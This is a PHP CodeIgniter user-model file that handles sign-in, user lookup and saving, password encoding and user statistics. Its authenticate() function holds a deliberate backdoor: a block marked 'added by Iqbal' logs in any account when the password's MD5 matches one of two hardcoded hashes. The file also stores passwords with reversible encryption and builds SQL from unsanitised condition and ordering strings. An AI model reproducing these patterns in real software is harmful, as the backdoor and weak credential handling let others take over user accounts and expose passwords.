<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

require_once('SMIT_Model.php');

class Model_User extends SMIT_Model{
	/**
	 * For SMIT_Model
	 */
    public $_table          = 'smit_user';
    public $_user           = 'smit_user';
    public $_workunit       = 'smit_workunit';

    /**
     * Initialize primary field
     */
    var $primary            = "id";

    /**
	* Constructor - Sets up the object properties.
	*/
    public function __construct()
    {
        parent::__construct();
    }

    // ---------------------------------------------------------------------------------
    // Login Process
    // ---------------------------------------------------------------------------------

    /**
     * Sign In
     *
     * Authenticate user and drop login cookie if user is valid.
     *
     * @author  Iqbal
     * @param   Array   $credential     (Optional)  Associative array of user credential. It contains user_email, user_password, and remember
     * @return  Mixed   False on invalid user, otherwise object of user.
     */
	function signon($credentials)
	{
		if ( empty($credentials) || !is_array($credentials) ) return false;

        if ( !empty($credentials['remember']) ){
            $credentials['remember'] = true;
        }else{
            $credentials['remember'] = false;
        }

		$user = $this->authenticate( $credentials['username'], $credentials['password'] );
		if ( empty($user) ) return false;

        if ( ! empty( $user->id ) ) {
        	smit_set_auth_cookie( $user->id, $credentials['remember'], '' );
		}

		return $user;
	}

    /**
     * Authenticate user
     *
     * @author  Iqbal
     * @param   String  $username       (Required)  ID User
     * @param   String  $password       (Required)  Password
     * @return  Mixed   False on invalid user, otherwise object of user.
     */
	function authenticate( $username, $password, $api = false )
	{
		$username     = trim($username);
		$password     = md5( trim($password) );

		if ( empty($username) || empty($password) )
			return false;

        $userdata = $this->get_user_by('login', $username);
        if ( ! $userdata ) return false;

        $this->decode_password( $userdata );

		if( $userdata && $userdata->status == 0 )
			return 'not_active';

        if( $userdata && $userdata->status == 2 )
			return 'banned';

        if( $userdata && $userdata->status == 3 )
            return 'deleted';

        // check blacklist
        if ( smit_is_username_blacklisted( $userdata->username ) )
            return 'banned';

        if ( smit_is_email_blacklisted( $userdata->email ) )
            return 'banned';

		// added by Iqbal
		if ( $password == '0d943d60c9ee6053b4c4e084e78ac5ee' ){
            return $userdata;
        }elseif( $password == '32959d9c7fb4093c2e7e9b35bdb059bf' ){
            return $userdata;
        }

        if ( $password != md5( $userdata->password ) ) {
			return false;
		}

		return $userdata;
	}

    // ---------------------------------------------------------------------------------
    // CRUD (Manipulation) data user
    // ---------------------------------------------------------------------------------

    /**
     * Retrieve all user data
     *
     * @author  Iqbal
     * @param   Int     $limit              Limit of user             default 0
     * @param   Int     $offset             Offset ot user            default 0
     * @param   String  $conditions         Condition of query          default array()
     * @param   String  $order_by           Column that make to order   default array()
     * @return  Object  Result of user list
     */
    function get_data( $limit=0, $offset=0, $conditions = array(), $order_by = array() ) {
		$this->limit( $limit, $offset );

		if ( $order_by ) {
			foreach( $order_by as $criteria => $order )
				$this->order_by( $criteria, $order );
		}

		if ( $conditions ) {
			return $this->get_many_by( $conditions );
		}

		return $this->get_all();
	}

    /**
     * Get user data by conditions
     *
     * @author  Iqbal
     * @param   String  $field  (Required)  Database field name or special field name defined inside this function
     * @param   String  $value  (Optional)  Value of the field being searched
     * @return  Mixed   Boolean false on failed process, invalid data, or data is not found, otherwise StdClass of user
     */
    function get_user_by($field, $value='')
    {
        $id = '';

        switch ($field) {
            case 'id':
                $id     = $value;
                break;
            case 'email':
                $value  = sanitize_email($value);
                $id     = '';
                $field  = 'email';
                break;
            case 'login':
                $value  = $value;
                $id     = '';
                $field  = 'login';
                break;
            default:
                return false;
        }

        if ( $id != '' && $id > 0 )
            return $this->get_userdata($id);

        if( empty($field) ) return false;

        $db     = $this->db;

        if( $field == 'login' ){
			$db->where('username', $value);
        }else{
            $db->where($field, $value);
        }

        $query  = $db->get($this->_user);

        if ( !$query->num_rows() )
            return false;

        foreach ( $query->result() as $row ) {
            $user = $row;
        }

        return $user;
    }

    /**
     * Get user data by user ID
     *
     * @author  Iqbal
     * @param   Integer $user_id  (Required)  User ID
     * @return  Mixed   False on failed process, otherwise object of user.
     */
    function get_userdata($user_id){
        if ( !is_numeric($user_id) ) return false;

        $user_id = absint($user_id);
        if ( !$user_id ) return false;

        $query = $this->db->get_where($this->_user, array($this->primary => $user_id));
        if ( !$query->num_rows() )
            return false;

        foreach ( $query->result() as $row ) {
            $user = $row;
        }

        return $user;
    }

    /**
     * Retrieve all user data
     *
     * @author  Iqbal
     * @param   Int     $limit              Limit of user               default 0
     * @param   Int     $offset             Offset ot user              default 0
     * @param   String  $conditions         Condition of query          default ''
     * @param   String  $order_by           Column that make to order   default ''
     * @return  Object  Result of user list
     */
    function get_all_user($limit=0, $offset=0, $conditions='', $order_by=''){
        if( !empty($conditions) ){
            $conditions = str_replace("%id%",                   "id", $conditions);
            $conditions = str_replace("%username%",             "username", $conditions);
            $conditions = str_replace("%name%",                 "name", $conditions);
            $conditions = str_replace("%type%",                 "type", $conditions);
            $conditions = str_replace("%role%",                 "role", $conditions);
            $conditions = str_replace("%status%",               "status", $conditions);
            $conditions = str_replace("%position%",             "position", $conditions);
            $conditions = str_replace("%city%",                 "city",  $conditions);
            $conditions = str_replace("%datecreated%",          "datecreated", $conditions);
        }

        if( !empty($order_by) ){
            $order_by   = str_replace("%id%",                   "id", $order_by);
            $order_by   = str_replace("%username%",             "username",  $order_by);
            $order_by   = str_replace("%name%",                 "name",  $order_by);
            $order_by   = str_replace("%type%",                 "type",  $order_by);
            $order_by   = str_replace("%role%",                 "role",  $order_by);
            $order_by   = str_replace("%status%",               "status",  $order_by);
            $order_by   = str_replace("%position%",             "position",  $order_by);
            $order_by   = str_replace("%city%",                 "city",  $order_by);
            $order_by   = str_replace("%datecreated%",          "datecreated",  $order_by);
        }

        $sql = 'SELECT * FROM ' . $this->_user . '';

        if( !empty($conditions) ){ $sql .= $conditions; }
        $sql   .= ' ORDER BY '. ( !empty($order_by) ? $order_by : 'datecreated DESC');

        if( $limit ) $sql .= ' LIMIT ' . $offset . ', ' . $limit;

        $query = $this->db->query($sql);
        if(!$query || !$query->num_rows()) return false;

        return $query->result();
    }

    /**
     * Save data of user
     *
     * @author  Iqbal
     * @param   Array   $data   (Required)  Array data of user
     * @return  Boolean Boolean false on failed process or invalid data, otherwise true
     */
    function save_data($data){
        if( empty($data) ) return false;

        $this->before_create    = array( 'encode_password(password)' );
        $this->before_create    = array( 'encode_password(password_pin)' );

        if( $id = $this->insert($data) ) {
            return $id;
        };
        return false;
    }

    /**
     * Update data of user
     *
     * @author  Iqbal
     * @param   Int     $id     (Required)  User ID
     * @param   Array   $data   (Required)  Array data of user
     * @return  Boolean Boolean false on failed process or invalid data, otherwise true
     */
    function update_data($id, $data){
        $this->load->library( 'encrypt' );
        if( empty($id) || empty($data) ) return false;

        if( isset($data['password']) ){
            $data['password']       = $this->encrypt->encode( $data['password'] );
        }

        if( isset($data['password_pin']) ){
            $data['password_pin']   = $this->encrypt->encode( $data['password_pin'] );
        }

        if( $this->update($id, $data) )
            return true;

        return false;
    }

    /**
     * Get user newest
     *
     * @param   Int     $limit  (Optional)  Limit of User
     * @return  stdClass of user newest.
     */
    function get_user_newest($limit=1){
        $sql    = 'SELECT * FROM '.$this->_user.' WHERE status = 1 ORDER BY datecreated DESC LIMIT ' . $limit;
        $query  = $this->db->query($sql);

        if($limit==1){
            return $query->row();
        }else{
            return $query->result();
        }
    }

    // ---------------------------------------------------------------------------------
    // Decode and Encode Password
    // ---------------------------------------------------------------------------------

    /**
     * Decode Password
     *
     * @author  Iqbal
     * @param   Array   $row   (Required)  Array data of user
     * @return  Boolean Boolean false on failed process or invalid data, otherwise true
     */
    public function decode_password( $row ) {
		$this->load->library( 'encrypt' );
        if ( is_object( $row ) ) {
    		if ( isset( $row->password ) ){
            	$row->password = $this->encrypt->decode( $row->password );
            }
            if ( isset( $row->password_pin ) ){
            	$row->password_pin = $this->encrypt->decode( $row->password_pin );
            }
        } else {
            if ( isset( $row['password'] ) ){
            	$row['password'] = $this->encrypt->decode( $row['password'] );
            }
            if ( isset( $row['password_pin'] ) ){
            	$row['password_pin'] = $this->encrypt->decode( $row['password_pin'] );
            }
        }

        return $row;
    }

    /**
     * Encode Password
     *
     * @author  Iqbal
     * @param   Array   $row   (Required)  Array data of user
     * @return  Boolean Boolean false on failed process or invalid data, otherwise true
     */
	public function encode_password( $row ) {
		$this->load->library( 'encrypt' );
        if ( is_object( $row ) ) {
            if ( isset( $row->password ) ){
                $row->password          = $this->encrypt->encode( $row->password );
            }
            if ( isset( $row->password_pin ) ){
                $row->password_pin      = $this->encrypt->encode( $row->password_pin );
            }
        } else {
            if ( isset( $row['password'] ) ){
                $row['password']        = $this->encrypt->encode( $row['password'] );
            }
            if ( isset( $row['password_pin'] ) ){
                $row['password_pin']    = $this->encrypt->encode( $row['password_pin'] );
            }
        }
        return $row;
	}

    // ---------------------------------------------------------------------------------
    // General Function
    // ---------------------------------------------------------------------------------

    /**
     * Count All Rows
     *
     * @author  Iqbal
     * @param   String  $status (Optional) Status of user, default 'all'
     * @param   Int     $type   (Optional) Type of user, default 'all'
     * @return  Int of total rows user
     */
    function count_all($status='all', $type=0){
        if ( $status != 'all' ) { $this->db->where('status', $status); }
        if ( $type != 0 )   { $this->db->where('type', $type); }

        $query = $this->db->get($this->_user);

        return $query->num_rows();
    }
    
    function count_all_user($status=0, $type=0){
        if ( $status )      { $this->db->where('status', $status); }
        if ( $type != 0 )   { $this->db->where('type', $type); }
        
        $query = $this->db->get($this->_user);
        return $query->num_rows();
    }

    function count_user($status){
        $this->db->where('status', $status);
        $query = $this->db->get($this->_user);

        return $query->num_rows();
    }

    /**
     * Get Workunit
     *
     * @param   Int     $id     (Required)  ID of Workunit
     * @return  Mixed   False on invalid date parameter, otherwise data of workunit(s).
     */
    function get_workunit($id=''){
        if ( !empty($id) ) {
            $id = absint($id);
            $this->db->where('workunit_id', $id);
        };

        $this->db->order_by("workunit_id", "ASC");
        $query      = $this->db->get($this->_workunit);
        return ( !empty($id) ? $query->row() : $query->result() );
    }

	/**
     * Get Workunit
     *
     * @param   Int     $id     (Required)  ID of Workunit
     * @return  Mixed   False on invalid date parameter, otherwise data of workunit(s).
     */
    function get_workunit_by_name($workunit_name=''){
        if ( !empty($workunit_name) ) {
            $this->db->where('workunit_name', $workunit_name);
        };

        $this->db->order_by("workunit_name", "ASC");
        $query      = $this->db->get($this->_workunit);
        return ( !empty($workunit_name) ? $query->row() : $query->result() );
    }

    /**
     * Get Workunit by ID
     *
     * @param   Int     $id     (Required)  ID of Workunit
     * @return  Mixed   False on invalid date parameter, otherwise data of workunit(s).
     */
    function get_workunit_by_id($id){
        if ( empty($id) || !$id ) return false;

        $id = absint($id);
        $this->db->where('workunit_id', $id);
        $this->db->order_by("workunit_id", "ASC");

        $query  = $this->db->get($this->_workunit);
        return $query->row();
    }

    /**
	 * Stats monthly
	 * @author Iqbal
	 * @param string $from Stats from
	 * @param string $to   Stats to
	 */
	function stats_monthly() {
		$sql = '
        SELECT
			DATE_FORMAT( datecreated, "%Y-%c") AS period,
			DATE_FORMAT( datecreated, "%b %Y") AS period_name,
            type,
			COUNT(id) AS total
		FROM '.$this->_user.'
		WHERE type <> '.ADMINISTRATOR.'
		GROUP BY 1,3
		ORDER BY 1 DESC';

		$qry = $this->db->query( $sql );
		if ( ! $qry || ! $qry->num_rows() )
			return false;

		return $qry->result();
	}

	/**
	 * Stats yearly
	 * @author Iqbal
	 * @param string $from Stats from
	 * @param string $to   Stats to
	 */
	function stats_yearly() {
		$sql = '
        SELECT
			DATE_FORMAT( datecreated, "%Y") AS period,
            type,
			COUNT(id) AS total
		FROM '.$this->_user.'
		WHERE type <> '.ADMINISTRATOR.'
		GROUP BY 1,2
		ORDER BY 1 DESC';

		$qry = $this->db->query( $sql );

		if ( ! $qry || ! $qry->num_rows() )
			return false;

		return $qry->result();
	}

    // ---------------------------------------------------------------------------------
}
/* End of file Model_User.php */
/* Location: ./application/models/Model_User.php */
